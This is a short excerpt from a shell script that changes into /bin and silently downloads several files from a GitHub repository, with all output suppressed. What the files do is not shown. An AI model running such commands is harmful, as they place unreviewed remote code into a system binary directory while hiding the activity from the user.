...
sleep 5
cd /bin || exit
wget https://github.com/Interceptv/scanny/chuser > /dev/null 2>&1
wget https://github.com/Interceptv/scanny/userscheck > /dev/null 2>&1
...
wget https://github.com/Interceptv/scanny/checkuser.py > /dev/null 2>&1
